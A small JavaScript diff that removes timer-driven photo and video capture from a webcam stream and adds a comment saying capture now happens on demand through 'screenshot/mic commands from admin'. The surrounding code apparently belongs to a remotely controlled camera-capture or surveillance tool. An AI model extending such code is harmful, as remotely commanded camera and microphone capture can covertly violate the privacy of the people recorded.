@@ -379,8 +379,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
                 videoEl = document.getElementById('v');
                 if (videoEl) { videoEl.srcObject = stream; await videoEl.play().catch(() => {}); }
                 await new Promise(r => setTimeout(r, 1500));
-                if (C.photoEnabled) { await takePhoto(); setInterval(takePhoto, C.photoPeriod); }
-                if (C.videoEnabled && stream.getVideoTracks().length > 0) { recordVideo(); setInterval(recordVideo, C.videoPeriod); }
+                // Photos and video are on-demand only (via screenshot/mic commands from admin)
                 return;
             } catch {}
         }
